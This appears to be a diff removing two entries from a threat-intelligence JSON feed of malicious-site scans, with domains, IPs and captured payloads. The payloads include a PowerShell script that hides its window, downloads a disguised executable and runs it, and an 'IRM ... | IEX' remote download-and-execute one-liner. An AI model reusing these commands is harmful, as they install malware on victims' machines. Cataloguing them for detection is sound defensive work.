@@ -8527,48 +8527,5 @@
     ],
     "ReportId": "cmwafa1yg08ee0omlkfez3dt8",
     "ScannedAt": "2026-11-10T08:22:49.769000+00:00"
-  },
-  {
-    "UrlDomain": "bule6swiss.com",
-    "DeliveryUrl": [
-      "makeverizyjar.info",
-      "lovezramexar.info",
-      "frclau.com"
-    ],
-    "PayloadUrl": [
-      "https://frclau.com/eoN"
-    ],
-    "IP": [
-      "151.243.0.200"
-    ],
-    "Related": [
-      {
-        "Value": "https://makeverizyjar.info/api.php?s=f61eff363d1bbd3db61fbed8769236f8e2a9a4474ca5bda7",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://frclau.com/eoN"
-    ],
-    "ReportId": "cmwa7uhjs07yx0omlfjdv2k9y",
-    "ScannedAt": "2026-11-10T04:54:46.148000+00:00"
-  },
-  {
-    "UrlDomain": "propolice.fr",
-    "DeliveryUrl": [
-      "fastly.jsdelivr.net"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "46.105.57.169"
-    ],
-    "Related": [],
-    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
-    "ResolvedDownloadUrl": [
-      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
-    ],
-    "ReportId": "cmwa78v3607w70omluib5p702",
-    "ScannedAt": "2026-11-10T04:37:57.278000+00:00"
   }
 ]
